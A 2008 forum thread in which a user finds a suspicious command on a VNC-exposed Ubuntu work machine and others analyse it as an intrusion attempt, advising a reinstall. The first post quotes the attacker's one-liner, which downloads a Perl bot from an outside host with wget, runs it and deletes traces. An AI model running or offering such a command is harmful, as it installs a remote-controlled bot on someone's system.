---
title: "Perl Bot Attack Attempted?"
date: 2008-01-27
forum: Server Platforms
---

### Post by smultronstallet on 2008-01-27
I think I may have been attacked (or attempted to be). When I got on my computer after it was sitting on all night, I saw a new text file open with a series of commands in it:

```
cd /var/tmp/;wget http://usuarios.lycos.es/crackerz/bot.txt;perl box.txt;rm -rf bo
```

Any ideas, suggestions or insight as to how it happened and what I should do now to prevent it again? Anyone know perl and can tell me what the script was trying to do? This is on a default 7.10 install.

---

### Post by The Cog on 2008-01-28
That's definitely a hacker script. It's probably still there in /var/tmp/bot.txt. How do you mean you saw a new text file open? In the GUI? In a text editor? In your browser?

Do you have a VNC server running that could have been hijacked?
The line you posted has errors, I think. First it downloads bot.txt but then tries to execute box.txt - typing error perhaps? Followed by tryng to delete bo which might be the first two letters of box or bot. This makes me think the attacker was typing manually. 

I'd say your only safe recourse is to reformat and reinstall. But it would be interesting to figure out how he got in.

---

### Post by MJN on 2008-01-28
> **The Cog said:**
> but then tries to execute box.txt - typing error perhaps?
 
It is exceuting it using the Perl command interpreter hence the file extension doesn't matter. The file will likely contain a whole load of Perl commands.

---

### Post by The Cog on 2008-01-28
It does matter whan that's not the name of the downloaded file - it'll get a no such file error from the perl interpreter.

---

### Post by MJN on 2008-01-28
Ah, yes, I missed the filename error. I thought you were referring to the extension!

Apologies,

Mathew

---

### Post by smultronstallet on 2008-01-28
> **The Cog said:**
> That's definitely a hacker script. It's probably still there in /var/tmp/bot.txt. How do you mean you saw a new text file open? In the GUI? In a text editor? In your browser?

Do you have a VNC server running that could have been hijacked?
The line you posted has errors, I think. First it downloads bot.txt but then tries to execute box.txt - typing error perhaps? Followed by tryng to delete bo which might be the first two letters of box or bot. This makes me think the attacker was typing manually. 

I'd say your only safe recourse is to reformat and reinstall. But it would be interesting to figure out how he got in.

Actually, yes it had VNC running. And yes, it was in a new (and unsaved) gedit window. There was also an OpenOffice Spreadsheet open with some similar text, but I didn't catch it. 

It's a work computer so I'm not sure who had access to it when I left, though I can't imagine anyone knowing anything about Linux/Ubuntu where I work. The password isn't that secure (not my choice, shared computer) so perhaps it was just brute forced. Or maybe someone else at work was following a "tutorial" which suggested copying and pasting those steps. I dunno.

Thanks for the info guys.

---

